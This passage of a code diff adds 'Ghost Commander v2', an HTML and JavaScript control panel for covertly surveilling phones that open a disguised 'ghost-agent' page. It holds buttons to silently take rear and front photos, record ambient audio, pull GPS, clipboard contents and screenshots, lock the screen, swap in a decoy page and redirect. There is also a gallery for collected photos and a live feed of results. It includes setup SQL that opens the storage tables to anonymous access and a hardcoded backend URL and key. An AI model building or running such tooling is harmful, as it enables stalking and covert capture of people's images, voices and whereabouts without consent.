@@ -1,0 +1,1099 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ghost Commander v2</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@700;800&display=swap');
+
+:root {
+  --bg:      #04060d;
+  --surf:    #080c18;
+  --card:    #0c1120;
+  --border:  #151f3a;
+  --border2: #1e2d52;
+  --green:   #00e5a0;
+  --cyan:    #00c8e5;
+  --warn:    #ff3d5a;
+  --purple:  #b467ff;
+  --gold:    #ffb726;
+  --text:    #c0d4f0;
+  --muted:   #3d5070;
+  --glow-g:  0 0 18px rgba(0,229,160,0.25);
+  --glow-c:  0 0 18px rgba(0,200,229,0.25);
+  --glow-w:  0 0 18px rgba(255,61,90,0.25);
+  --glow-p:  0 0 18px rgba(180,103,255,0.25);
+}
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+  font-family: 'Space Mono', monospace;
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  overscroll-behavior: none;
+}
+
+/* ── SCANLINES texture ── */
+body::before {
+  content: '';
+  position: fixed; inset: 0; z-index: 0; pointer-events: none;
+  background: repeating-linear-gradient(
+    0deg, transparent, transparent 2px,
+    rgba(0,0,0,0.04) 2px, rgba(0,0,0,0.04) 4px
+  );
+}
+
+/* ── HEADER ── */
+.hdr {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 12px 16px;
+  background: rgba(8,12,24,0.97);
+  border-bottom: 1px solid var(--border);
+  position: sticky; top: 0; z-index: 300;
+  backdrop-filter: blur(16px);
+}
+.logo {
+  font-family: 'Syne', sans-serif;
+  font-size: 18px; font-weight: 800;
+  color: var(--green);
+  letter-spacing: 3px;
+  text-shadow: var(--glow-g);
+}
+.logo em { color: var(--warn); font-style: normal; }
+.hdr-right { display: flex; align-items: center; gap: 10px; }
+.conn-pill {
+  display: flex; align-items: center; gap: 6px;
+  background: var(--card); border: 1px solid var(--border2);
+  border-radius: 100px; padding: 5px 10px;
+  font-size: 10px; color: var(--muted); letter-spacing: 1px;
+}
+.dot {
+  width: 7px; height: 7px; border-radius: 50%;
+  background: var(--green);
+  box-shadow: var(--glow-g);
+  animation: pulse 1.4s infinite;
+}
+.dot.err { background: var(--warn); box-shadow: var(--glow-w); }
+@keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.25;} }
+
+/* ── DEVICE SUMMARY BAR ── */
+.dev-bar {
+  background: var(--surf);
+  border-bottom: 1px solid var(--border);
+  padding: 8px 16px;
+  display: flex; gap: 8px; overflow-x: auto;
+  scrollbar-width: none;
+}
+.dev-bar::-webkit-scrollbar { display: none; }
+.dev-mini {
+  flex-shrink: 0;
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 8px; padding: 6px 10px;
+  font-size: 10px; cursor: pointer; transition: all 0.15s;
+  display: flex; align-items: center; gap: 6px;
+  white-space: nowrap;
+}
+.dev-mini.online  { border-color: var(--green);  color: var(--green); }
+.dev-mini.offline { border-color: var(--muted);  color: var(--muted); }
+.dev-mini.selected { background: rgba(0,229,160,0.08); box-shadow: var(--glow-g); }
+.dev-mini .dm-dot { width: 5px; height: 5px; border-radius: 50%; background: currentColor; }
+.dev-mini-empty { color: var(--muted); font-size: 11px; padding: 8px 0; }
+
+/* ── TABS ── */
+.tabs {
+  display: flex;
+  background: var(--surf);
+  border-bottom: 1px solid var(--border);
+  position: sticky; top: 53px; z-index: 200;
+  overflow-x: auto; scrollbar-width: none;
+}
+.tabs::-webkit-scrollbar { display: none; }
+.tab {
+  flex: 1; padding: 12px 6px; text-align: center;
+  font-size: 10px; letter-spacing: 1px;
+  cursor: pointer; color: var(--muted);
+  border-bottom: 2px solid transparent;
+  transition: all 0.2s; user-select: none;
+  min-width: 72px; white-space: nowrap;
+}
+.tab.active { color: var(--green); border-bottom-color: var(--green); }
+.tab:active { opacity: 0.7; }
+/* FIX: badge is a child span now, styled separately so tab innerHTML
+   can be updated safely without wiping the emoji */
+.tab .badge { color: var(--warn); font-size: 9px; margin-left: 2px; }
+
+.panel { display: none; padding: 14px; max-width: 540px; margin: 0 auto; }
+.panel.active { display: block; }
+
+.sec-label {
+  font-size: 9px; color: var(--muted); letter-spacing: 2.5px;
+  text-transform: uppercase; margin-bottom: 10px; padding-left: 2px;
+}
+.gap { margin-bottom: 14px; }
+
+/* ── TARGET ROW ── */
+.target-row { display: flex; gap: 8px; margin-bottom: 14px; }
+.t-chip {
+  flex: 1; background: var(--card); border: 1px solid var(--border);
+  border-radius: 10px; padding: 10px 8px; text-align: center;
+  font-size: 11px; cursor: pointer; transition: all 0.15s;
+}
+.t-chip.active { border-color: var(--green); color: var(--green); background: rgba(0,229,160,0.06); }
+.t-chip .tl  { font-size: 9px; color: var(--muted); margin-bottom: 3px; letter-spacing: 1px; }
+
+/* ── COMMAND CATEGORIES ── */
+.cmd-cat { margin-bottom: 16px; }
+.cmd-cat-title {
+  font-size: 9px; color: var(--muted); letter-spacing: 2px;
+  text-transform: uppercase; margin-bottom: 8px;
+  display: flex; align-items: center; gap: 8px;
+}
+.cmd-cat-title::after {
+  content: ''; flex: 1; height: 1px; background: var(--border);
+}
+.cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+.cmd-grid-3 { grid-template-columns: 1fr 1fr 1fr; }
+
+.cmd-btn {
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 10px; padding: 12px 8px;
+  text-align: center; cursor: pointer; transition: all 0.15s;
+  font-family: 'Space Mono', monospace;
+  color: var(--text); display: flex; flex-direction: column;
+  align-items: center; gap: 5px;
+}
+.cmd-btn:active  { transform: scale(0.95); opacity: 0.75; }
+.cmd-btn .ci     { font-size: 24px; }
+.cmd-btn .cn     { font-size: 11px; line-height: 1.2; }
+.cmd-btn .cl     { font-size: 9px; letter-spacing: 1px; margin-top: 2px; }
+.cmd-btn:hover   { border-color: var(--cyan); }
+.g .cl           { color: var(--green); }
+.g:hover         { border-color: var(--green); box-shadow: var(--glow-g); }
+.c .cl           { color: var(--cyan); }
+.c:hover         { border-color: var(--cyan); box-shadow: var(--glow-c); }
+.w .cl           { color: var(--warn); }
+.w:hover         { border-color: var(--warn); box-shadow: var(--glow-w); }
+.p .cl           { color: var(--purple); }
+.p:hover         { border-color: var(--purple); box-shadow: var(--glow-p); }
+.gold .cl        { color: var(--gold); }
+.gold:hover      { border-color: var(--gold); }
+
+/* ── CUSTOM CMD ── */
+.custom-wrap {
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 12px; padding: 12px; margin-bottom: 12px;
+}
+.custom-label { font-size: 9px; color: var(--muted); letter-spacing: 2px; margin-bottom: 8px; }
+.custom-row   { display: flex; gap: 8px; }
+.custom-in {
+  flex: 1; background: var(--surf); border: 1px solid var(--border2);
+  border-radius: 8px; padding: 10px 12px;
+  color: var(--green); font-family: 'Space Mono', monospace;
+  font-size: 12px; outline: none;
+}
+.custom-in:focus { border-color: var(--green); }
+.custom-in::placeholder { color: var(--muted); }
+.send-btn {
+  background: var(--green); border: none; border-radius: 8px;
+  padding: 10px 14px; color: #000;
+  font-family: 'Syne', sans-serif; font-size: 12px; font-weight: 800;
+  cursor: pointer; white-space: nowrap;
+}
+.send-btn:active { opacity: 0.8; }
+
+/* ── GALLERY ── */
+.gallery-tools { display: flex; gap: 8px; margin-bottom: 12px; align-items: center; }
+.gallery-sel {
+  flex: 1; background: var(--card); border: 1px solid var(--border);
+  border-radius: 8px; padding: 8px 10px;
+  color: var(--text); font-family: 'Space Mono', monospace; font-size: 11px; outline: none;
+}
+.gallery-sel option { background: var(--card); }
+.gallery-ref {
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 8px; padding: 8px 14px; color: var(--green);
+  font-family: 'Space Mono', monospace; font-size: 16px; cursor: pointer;
+}
+.gallery-ref:active { opacity: 0.7; }
+.gallery-cnt { font-size: 10px; color: var(--muted); margin-bottom: 10px; }
+.gallery-grid {
+  display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; margin-bottom: 16px;
+}
+.g-item {
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 10px; overflow: hidden; cursor: pointer; transition: border-color 0.2s;
+}
+.g-item:active { border-color: var(--purple); }
+.g-item img { width: 100%; aspect-ratio: 4/3; object-fit: cover; display: block; }
+.g-item-info { padding: 7px 9px; }
+.g-type { font-size: 9px; color: var(--purple); letter-spacing: 1px; }
+.g-time { font-size: 9px; color: var(--muted); margin-top: 2px; }
+.g-dev  { font-size: 9px; color: var(--muted); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.gallery-empty { text-align: center; padding: 48px 16px; color: var(--muted); font-size: 12px; border: 1px dashed var(--border); border-radius: 12px; }
+
+/* ── LIVE FEED ── */
+.feed-wrap { background: var(--card); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
+.feed-hdr {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 11px 14px; border-bottom: 1px solid var(--border);
+  font-size: 10px; color: var(--muted); letter-spacing: 1px;
+}
+.clr-btn {
+  background: none; border: 1px solid transparent; border-radius: 4px;
+  color: var(--warn); font-family: 'Space Mono', monospace; font-size: 10px;
+  cursor: pointer; padding: 2px 8px;
+}
+.clr-btn:hover { border-color: var(--warn); }
+.feed-list { max-height: 66vh; overflow-y: auto; }
+.feed-list::-webkit-scrollbar { width: 3px; }
+.feed-list::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 2px; }
+.f-item { border-bottom: 1px solid var(--border); padding: 11px 14px; animation: slideUp 0.3s ease; }
+@keyframes slideUp { from{opacity:0;transform:translateY(-6px);}to{opacity:1;transform:none;} }
+.f-meta { display: flex; align-items: center; justify-content: space-between; margin-bottom: 7px; }
+.f-badge {
+  font-size: 9px; padding: 2px 9px; border-radius: 100px; letter-spacing: 1.5px;
+  background: rgba(0,200,229,0.08); border: 1px solid var(--cyan); color: var(--cyan);
+  text-transform: uppercase;
+}
+.f-badge.photo      { background: rgba(180,103,255,0.08); border-color: var(--purple); color: var(--purple); }
+.f-badge.location   { background: rgba(0,229,160,0.08);   border-color: var(--green);  color: var(--green); }
+.f-badge.audio      { background: rgba(255,61,90,0.08);   border-color: var(--warn);   color: var(--warn); }
+.f-time { font-size: 9px; color: var(--muted); }
+.f-dev  { font-size: 9px; color: var(--muted); margin-bottom: 6px; }
+.f-body { font-size: 11px; color: var(--text); word-break: break-all; line-height: 1.65; }
+.f-body pre { white-space: pre-wrap; font-size: 10px; color: var(--green); }
+.f-img { width: 100%; max-height: 190px; object-fit: contain; border-radius: 8px; border: 1px solid var(--border); margin-top: 8px; cursor: zoom-in; }
+.f-audio { width: 100%; margin-top: 8px; height: 34px; }
+.loc-link {
+  display: inline-block; margin-top: 6px; color: var(--green);
+  text-decoration: none; font-size: 11px; border: 1px solid var(--green);
+  padding: 4px 12px; border-radius: 6px;
+}
+.save-btn {
+  margin-top: 7px; background: rgba(0,229,160,0.08); border: 1px solid var(--green);
+  color: var(--green); font-family: 'Space Mono', monospace; font-size: 10px;
+  padding: 4px 12px; border-radius: 6px; cursor: pointer; display: inline-block;
+}
+.save-btn:active { opacity: 0.7; }
+.f-empty { padding: 32px 16px; text-align: center; color: var(--muted); font-size: 12px; }
+
+/* ── DEVICES PANEL ── */
+.dev-card {
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 12px; padding: 14px 16px; margin-bottom: 8px;
+  cursor: pointer; transition: all 0.2s;
+  display: flex; align-items: center; gap: 12px;
+}
+.dev-card.online   { border-color: rgba(0,229,160,0.3); }
+.dev-card.selected { border-color: var(--green); box-shadow: var(--glow-g), inset 0 0 20px rgba(0,229,160,0.04); }
+.dev-card:active   { opacity: 0.8; }
+.dev-icon  { font-size: 28px; }
+.dev-id    { font-size: 12px; color: var(--green); word-break: break-all; }
+.dev-seen  { font-size: 10px; color: var(--muted); margin-top: 3px; }
+.dev-bat   { font-size: 10px; color: var(--gold); margin-top: 2px; }
+.dev-pill  {
+  margin-left: auto; font-size: 9px; padding: 3px 9px; border-radius: 100px;
+  border: 1px solid var(--green); color: var(--green); background: rgba(0,229,160,0.07);
+  white-space: nowrap; flex-shrink: 0;
+}
+.dev-pill.offline { border-color: var(--muted); color: var(--muted); background: none; }
+.no-devs {
+  text-align: center; padding: 28px 16px; color: var(--muted); font-size: 12px;
+  border: 1px dashed var(--border); border-radius: 12px; line-height: 1.8;
+}
+
+/* ── SETUP ── */
+.setup-card {
+  background: rgba(180,103,255,0.05);
+  border: 1px solid rgba(180,103,255,0.25);
+  border-radius: 12px; padding: 14px; margin-bottom: 14px;
+  font-size: 11px; line-height: 1.9; color: var(--text);
+}
+.setup-card strong { color: var(--purple); }
+.setup-card code {
+  background: rgba(0,0,0,0.45); padding: 2px 6px; border-radius: 4px;
+  color: var(--green); font-size: 10px;
+}
+
+/* ── SQL BLOCK ── */
+.sql-block {
+  background: rgba(0,0,0,0.5); border: 1px solid var(--border2);
+  border-radius: 8px; padding: 12px; margin-top: 10px; overflow-x: auto;
+}
+.sql-block pre {
+  font-family: 'Space Mono', monospace; font-size: 9px;
+  color: var(--green); white-space: pre; line-height: 1.7;
+}
+.copy-sql-btn {
+  margin-top: 8px; background: rgba(0,229,160,0.08); border: 1px solid var(--green);
+  color: var(--green); font-family: 'Space Mono', monospace; font-size: 10px;
+  padding: 5px 14px; border-radius: 6px; cursor: pointer;
+}
+.copy-sql-btn:active { opacity: 0.7; }
+
+/* ── LIGHTBOX ── */
+#lb {
+  display: none; position: fixed; inset: 0; z-index: 999;
+  background: rgba(0,0,0,0.97); flex-direction: column;
+  align-items: center; justify-content: center;
+}
+#lb.open { display: flex; animation: fadeIn .2s ease; }
+@keyframes fadeIn { from{opacity:0;}to{opacity:1;} }
+.lb-top {
+  position: absolute; top: 0; left: 0; right: 0;
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 14px 16px;
+  background: linear-gradient(to bottom, rgba(0,0,0,0.85), transparent);
+}
+.lb-title { font-family: 'Syne', sans-serif; font-size: 13px; color: var(--text); }
+.lb-acts { display: flex; gap: 8px; }
+.lb-btn { background: rgba(255,255,255,0.07); border: 1px solid rgba(255,255,255,0.12); border-radius: 8px; padding: 7px 14px; color: var(--text); font-family: 'Space Mono', monospace; font-size: 11px; cursor: pointer; }
+.lb-btn.dl  { background: rgba(0,229,160,0.1); border-color: var(--green); color: var(--green); }
+.lb-btn.cls { background: rgba(255,61,90,0.1); border-color: var(--warn); color: var(--warn); }
+#lbImg { max-width: 96vw; max-height: 80vh; object-fit: contain; border-radius: 8px; }
+.lb-bot {
+  position: absolute; bottom: 0; left: 0; right: 0; padding: 14px 16px;
+  background: linear-gradient(to top, rgba(0,0,0,0.85), transparent);
+  font-size: 10px; color: var(--muted); text-align: center;
+}
+
+/* ── TOAST ── */
+.toast {
+  position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%);
+  background: var(--card); border: 1px solid var(--border2);
+  color: var(--text); font-family: 'Space Mono', monospace; font-size: 12px;
+  padding: 10px 20px; border-radius: 8px; z-index: 9999;
+  box-shadow: 0 4px 24px rgba(0,0,0,0.7); white-space: nowrap;
+  animation: slideUp .2s ease;
+}
+
+/* ── STAT CARDS ── */
+.stats-row { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 14px; }
+.stat-card {
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 10px; padding: 12px 14px;
+}
+.stat-val { font-size: 22px; font-weight: 700; color: var(--green); font-family: 'Syne', sans-serif; }
+.stat-lbl { font-size: 10px; color: var(--muted); margin-top: 3px; letter-spacing: 1px; }
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<div class="hdr">
+  <div class="logo">GHOST<em>CMD</em></div>
+  <div class="hdr-right">
+    <div class="conn-pill">
+      <div class="dot" id="liveDot"></div>
+      <span id="connTxt">CONNECTING</span>
+    </div>
+  </div>
+</div>
+
+<!-- QUICK DEVICE BAR -->
+<div class="dev-bar" id="devBar">
+  <div class="dev-mini-empty">Scanning…</div>
+</div>
+
+<!-- TABS -->
+<div class="tabs">
+  <div class="tab active" id="tab-cmd"     onclick="switchTab('cmd')">⚡ CMD</div>
+  <div class="tab"        id="tab-devices" onclick="switchTab('devices')">📡 DEVICES</div>
+  <div class="tab"        id="tab-gallery" onclick="switchTab('gallery')">🖼 GALLERY</div>
+  <div class="tab"        id="tab-feed"    onclick="switchTab('feed')">📥 FEED</div>
+</div>
+
+<!-- ══ COMMANDS ══ -->
+<div class="panel active" id="panel-cmd">
+
+  <div class="sec-label gap" style="margin-top:4px">🎯 Target</div>
+  <div class="target-row">
+    <div class="t-chip active" id="chipAll" onclick="setTarget('all')">
+      <div class="tl">BROADCAST</div>All Devices
+    </div>
+    <div class="t-chip" id="chipOne" onclick="setTarget('one')">
+      <div class="tl">SPECIFIC</div>
+      <span id="chipOneLabel">Select ↑</span>
+    </div>
+  </div>
+
+  <!-- Camera -->
+  <div class="cmd-cat">
+    <div class="cmd-cat-title">📷 Camera</div>
+    <div class="cmd-grid">
+      <button class="cmd-btn p" onclick="sendCmd('capture')">
+        <span class="ci">📷</span><span class="cn">Rear Photo</span><span class="cl">CAPTURE</span>
+      </button>
+      <button class="cmd-btn p" onclick="sendCmd('selfie')">
+        <span class="ci">🤳</span><span class="cn">Selfie</span><span class="cl">FRONT CAM</span>
+      </button>
+      <button class="cmd-btn p" onclick="sendCmd('burst','3')">
+        <span class="ci">📸</span><span class="cn">Burst Rear</span><span class="cl">3 SHOTS</span>
+      </button>
+      <button class="cmd-btn p" onclick="sendCmd('burst_front','3')">
+        <span class="ci">🔄</span><span class="cn">Burst Front</span><span class="cl">3 SHOTS</span>
+      </button>
+    </div>
+  </div>
+
+  <!-- Audio -->
+  <div class="cmd-cat">
+    <div class="cmd-cat-title">🎙️ Audio</div>
+    <div class="cmd-grid">
+      <button class="cmd-btn w" onclick="sendCmd('audio','5')">
+        <span class="ci">🎙️</span><span class="cn">Record 5s</span><span class="cl">AMBIENT</span>
+      </button>
+      <button class="cmd-btn w" onclick="sendCmd('audio','15')">
+        <span class="ci">🔴</span><span class="cn">Record 15s</span><span class="cl">EXTENDED</span>
+      </button>
+    </div>
+  </div>
+
+  <!-- Location & Sensors -->
+  <div class="cmd-cat">
+    <div class="cmd-cat-title">📍 Location & Sensors</div>
+    <div class="cmd-grid">
+      <button class="cmd-btn g" onclick="sendCmd('location')">
+        <span class="ci">📍</span><span class="cn">GPS Location</span><span class="cl">COORDS</span>
+      </button>
+      <button class="cmd-btn g" onclick="sendCmd('orientation')">
+        <span class="ci">🧭</span><span class="cn">Orientation</span><span class="cl">TILT/ROTATE</span>
+      </button>
+    </div>
+  </div>
+
+  <!-- Device Intel -->
+  <div class="cmd-cat">
+    <div class="cmd-cat-title">📊 Device Intel</div>
+    <div class="cmd-grid">
+      <button class="cmd-btn c" onclick="sendCmd('status')">
+        <span class="ci">📊</span><span class="cn">Full Status</span><span class="cl">SYSTEM INFO</span>
+      </button>
+      <button class="cmd-btn c" onclick="sendCmd('battery')">
+        <span class="ci">🔋</span><span class="cn">Battery</span><span class="cl">LEVEL</span>
+      </button>
+      <button class="cmd-btn c" onclick="sendCmd('network')">
+        <span class="ci">📶</span><span class="cn">Network</span><span class="cl">WIFI/CELL</span>
+      </button>
+      <button class="cmd-btn c" onclick="sendCmd('storage')">
+        <span class="ci">💾</span><span class="cn">Storage</span><span class="cl">DISK USAGE</span>
+      </button>
+      <button class="cmd-btn c" onclick="sendCmd('clipboard')">
+        <span class="ci">📋</span><span class="cn">Clipboard</span><span class="cl">READ</span>
+      </button>
+      <button class="cmd-btn c" onclick="sendCmd('screenshot')">
+        <span class="ci">🖥️</span><span class="cn">Screenshot</span><span class="cl">SCREEN CAP</span>
+      </button>
+    </div>
+  </div>
+
+  <!-- Interaction -->
+  <div class="cmd-cat">
+    <div class="cmd-cat-title">⚡ Interaction</div>
+    <div class="cmd-grid">
+      <button class="cmd-btn gold" onclick="sendCmd('ping')">
+        <span class="ci">🏓</span><span class="cn">Ping</span><span class="cl">ALIVE CHECK</span>
+      </button>
+      <button class="cmd-btn gold" onclick="sendCmd('vibrate')">
+        <span class="ci">📳</span><span class="cn">Vibrate</span><span class="cl">BUZZ</span>
+      </button>
+      <button class="cmd-btn gold" onclick="sendCmd('vibrate_sos')">
+        <span class="ci">🆘</span><span class="cn">Vibrate SOS</span><span class="cl">MORSE</span>
+      </button>
+      <button class="cmd-btn gold" onclick="sendCmd('flash')">
+        <span class="ci">💡</span><span class="cn">Flash Screen</span><span class="cl">BLINK</span>
+      </button>
+      <button class="cmd-btn gold" onclick="promptAlert()">
+        <span class="ci">⚠️</span><span class="cn">Alert Popup</span><span class="cl">MESSAGE</span>
+      </button>
+      <button class="cmd-btn gold" onclick="promptSpeak()">
+        <span class="ci">🔊</span><span class="cn">Speak</span><span class="cl">TEXT-TO-SPEECH</span>
+      </button>
+    </div>
+  </div>
+
+  <!-- Control -->
+  <div class="cmd-cat">
+    <div class="cmd-cat-title">🔧 Control</div>
+    <div class="cmd-grid">
+      <button class="cmd-btn w" onclick="sendCmd('lock')">
+        <span class="ci">🔒</span><span class="cn">Lock</span><span class="cl">FREEZE UI</span>
+      </button>
+      <button class="cmd-btn g" onclick="sendCmd('unlock')">
+        <span class="ci">🔓</span><span class="cn">Unlock</span><span class="cl">RESTORE</span>
+      </button>
+      <button class="cmd-btn w" onclick="sendCmd('hide_decoy')">
+        <span class="ci">🫥</span><span class="cn">Hide Decoy</span><span class="cl">BLANK PAGE</span>
+      </button>
+      <button class="cmd-btn g" onclick="sendCmd('show_decoy')">
+        <span class="ci">👁️</span><span class="cn">Show Decoy</span><span class="cl">RESTORE UI</span>
+      </button>
+      <button class="cmd-btn w" onclick="sendCmd('reload')">
+        <span class="ci">🔄</span><span class="cn">Reload Page</span><span class="cl">REFRESH</span>
+      </button>
+      <button class="cmd-btn w" onclick="promptRedirect()">
+        <span class="ci">↗️</span><span class="cn">Redirect</span><span class="cl">OPEN URL</span>
+      </button>
+    </div>
+  </div>
+
+  <!-- Custom Command -->
+  <div class="custom-wrap">
+    <div class="custom-label">// CUSTOM COMMAND</div>
+    <div class="custom-row">
+      <input class="custom-in" id="customIn"
+        placeholder="command [param]…"
+        onkeydown="if(event.key==='Enter')sendCustom()">
+      <button class="send-btn" onclick="sendCustom()">EXEC</button>
+    </div>
+  </div>
+</div>
+
+<!-- ══ DEVICES ══ -->
+<div class="panel" id="panel-devices">
+  <div class="setup-card">
+    <strong>⚙ Supabase Setup</strong><br>
+    1. Go to your Supabase project → SQL Editor.<br>
+    2. Paste and run the SQL below.<br>
+    3. Open <code>ghost-agent-TARGET.html</code> on the target phone.<br>
+    4. Device registers within ~10s and appears below.
+    <div class="sql-block">
+      <pre id="sqlText">-- Run this in Supabase SQL Editor:
+
+create table if not exists ghost_devices (
+  device_id text primary key,
+  info      text,
+  battery   text,
+  last_seen timestamptz default now(),
+  online    boolean default false
+);
+
+create table if not exists ghost_commands (
+  id         bigserial primary key,
+  device_id  text not null,
+  command    text not null,
+  param      text default '',
+  executed   boolean default false,
+  created_at timestamptz default now()
+);
+
+create table if not exists ghost_results (
+  id         bigserial primary key,
+  device_id  text not null,
+  type       text not null,
+  payload    text,
+  created_at timestamptz default now()
+);
+
+-- Allow anon read/write for all three tables:
+alter table ghost_devices  enable row level security;
+alter table ghost_commands enable row level security;
+alter table ghost_results  enable row level security;
+
+create policy "anon all" on ghost_devices  for all using (true) with check (true);
+create policy "anon all" on ghost_commands for all using (true) with check (true);
+create policy "anon all" on ghost_results  for all using (true) with check (true);</pre>
+    </div>
+    <button class="copy-sql-btn" onclick="copySql()">📋 Copy SQL</button>
+  </div>
+  <div class="stats-row" id="statsRow">
+    <div class="stat-card"><div class="stat-val" id="statOnline">0</div><div class="stat-lbl">ONLINE NOW</div></div>
+    <div class="stat-card"><div class="stat-val" id="statTotal">0</div><div class="stat-lbl">TOTAL SEEN</div></div>
+  </div>
+  <div class="sec-label gap">📡 Devices</div>
+  <div id="deviceList"><div class="no-devs">Scanning for devices…</div></div>
+</div>
+
+<!-- ══ GALLERY ══ -->
+<div class="panel" id="panel-gallery">
+  <div class="gallery-tools">
+    <select class="gallery-sel" id="galFilter" onchange="renderGallery()">
+      <option value="all">All Photos</option>
+      <option value="capture">Rear Camera</option>
+      <option value="selfie">Selfie</option>
+      <option value="screenshot">Screenshots</option>
+    </select>
+    <button class="gallery-ref" onclick="loadGallery()">↻</button>
+  </div>
+  <div class="gallery-cnt" id="galCnt"></div>
+  <div id="galGrid" class="gallery-grid"></div>
+  <div id="galEmpty" class="gallery-empty" style="display:none">
+    📷 No photos yet.<br>Send a Capture or Selfie command.
+  </div>
+</div>
+
+<!-- ══ FEED ══ -->
+<div class="panel" id="panel-feed">
+  <div class="feed-wrap">
+    <div class="feed-hdr">
+      <span>📥 LIVE FEED</span>
+      <button class="clr-btn" onclick="clearFeed()">CLEAR</button>
+    </div>
+    <div class="feed-list" id="feedList">
+      <div class="f-empty">No results yet.<br>Send a command.</div>
+    </div>
+  </div>
+</div>
+
+<!-- LIGHTBOX -->
+<div id="lb">
+  <div class="lb-top">
+    <div class="lb-title" id="lbTitle">Photo</div>
+    <div class="lb-acts">
+      <button class="lb-btn dl"  onclick="dlCurrentPhoto()">⬇ Save</button>
+      <button class="lb-btn cls" onclick="closeLb()">✕</button>
+    </div>
+  </div>
+  <img id="lbImg" src="" alt="">
+  <div class="lb-bot" id="lbMeta"></div>
+</div>
+
+<script>
+// ═══════════════════════════════════════════════════════════════
+//  CONFIG
+// ═══════════════════════════════════════════════════════════════
+const SUPABASE_URL = 'https://muyevssqiuvhcozgxtlp.supabase.co';
+const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im11eWV2c3NxaXV2aGNvemd4dGxwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg0MTE4NTQsImV4cCI6MjA5Mzk4Nzg1NH0.jzN6V1UArKq5epxK3tTXuo1cGukH5oKD9qAi1FQWGUU';
+const HDR = {
+  'apikey':        SUPABASE_KEY,
+  'Authorization': 'Bearer ' + SUPABASE_KEY,
+  'Content-Type':  'application/json'
+};
+
+let selectedDeviceId = 'all';
+let targetMode       = 'all';
+let allPhotos        = [];
+let curLbPhoto       = null;
+let lastResultId     = 0;
+let newPhotoCnt      = 0;
+window._feedPhotos   = {};
+
+// ═══════════════════════════════════════════════════════════════
+//  SUPABASE HELPERS
+//  FIX: dbSelect now properly awaits r.json() — previously
+//       returned a raw Promise instead of resolved array,
+//       causing devices/results/gallery to always be empty.
+// ═══════════════════════════════════════════════════════════════
+async function dbInsert(table, row) {
+  try {
+    const r = await fetch(`${SUPABASE_URL}/rest/v1/${table}`, {
+      method:  'POST',
+      headers: { ...HDR, 'Prefer': 'return=minimal' },
+      body:    JSON.stringify(row)
+    });
+    return r.ok;
+  } catch(e) { return false; }
+}
+
+async function dbSelect(table, qs) {
+  try {
+    const r = await fetch(`${SUPABASE_URL}/rest/v1/${table}?${qs}`, { headers: HDR });
+    // FIX: was `return r.ok ? r.json() : []`
+    // r.json() is a Promise — must await it to get the actual array
+    if (!r.ok) return [];
+    return await r.json();
+  } catch(e) { return []; }
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  SQL COPY HELPER
+// ═══════════════════════════════════════════════════════════════
+function copySql() {
+  const sql = document.getElementById('sqlText').textContent;
+  navigator.clipboard.writeText(sql).then(() => showToast('📋 SQL copied!')).catch(() => {
+    // fallback for browsers without clipboard API
+    const ta = document.createElement('textarea');
+    ta.value = sql; ta.style.position = 'fixed'; ta.style.opacity = '0';
+    document.body.appendChild(ta); ta.select(); document.execCommand('copy');
+    ta.remove(); showToast('📋 SQL copied!');
+  });
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  TABS
+//  FIX: guard null elements; badge update uses child span
+//       instead of overwriting full innerHTML (which broke emoji)
+// ═══════════════════════════════════════════════════════════════
+function switchTab(name) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  const tabEl   = document.getElementById('tab-' + name);
+  const panelEl = document.getElementById('panel-' + name);
+  if (!tabEl || !panelEl) return;
+  tabEl.classList.add('active');
+  panelEl.classList.add('active');
+
+  if (name === 'gallery') {
+    newPhotoCnt = 0;
+    // FIX: use a child span for the badge so the emoji isn't wiped
+    const badgeEl = tabEl.querySelector('.badge');
+    if (badgeEl) badgeEl.remove();
+    loadGallery();
+  }
+  if (name === 'devices') pollDevices();
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  TARGET
+// ═══════════════════════════════════════════════════════════════
+function setTarget(mode) {
+  targetMode = mode;
+  document.getElementById('chipAll').classList.toggle('active', mode === 'all');
+  document.getElementById('chipOne').classList.toggle('active', mode === 'one');
+}
+function selectDevice(id) {
+  selectedDeviceId = id;
+  const short = id.replace('device_', '').slice(0, 14);
+  const label = short + (short.length < id.replace('device_','').length ? '…' : '');
+  document.getElementById('chipOneLabel').textContent = label;
+  setTarget('one');
+  document.querySelectorAll('.dev-card').forEach(c => c.classList.toggle('selected', c.dataset.id === id));
+  document.querySelectorAll('.dev-mini').forEach(m => m.classList.toggle('selected', m.dataset.id === id));
+  showToast(`🎯 Target: ${short}`);
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  SEND COMMAND
+// ═══════════════════════════════════════════════════════════════
+async function sendCmd(command, param) {
+  param = param !== undefined ? String(param) : '';
+  const targetId = targetMode === 'all' ? 'all' : selectedDeviceId;
